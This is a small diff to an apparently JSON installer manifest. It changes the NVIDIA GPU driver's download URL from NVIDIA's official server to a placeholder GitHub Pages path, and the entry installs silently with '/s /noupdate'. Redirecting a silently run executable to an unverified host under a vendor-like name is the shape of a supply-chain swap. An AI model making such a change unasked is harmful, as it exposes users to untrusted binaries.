@@ -2,7 +2,7 @@
   {
     "id": 1,
     "name": "NVIDIA GeForce GPU Driver",
-    "url": "https://us.download.nvidia.com/nvapp/client/11.0.8.299/NVIDIA_app_v11.0.8.299.exe",
+    "url": "https://your-username.github.io/repo/binaries/NvidiaDriver.exe",
     "args": "/s /noupdate"
   },
   {
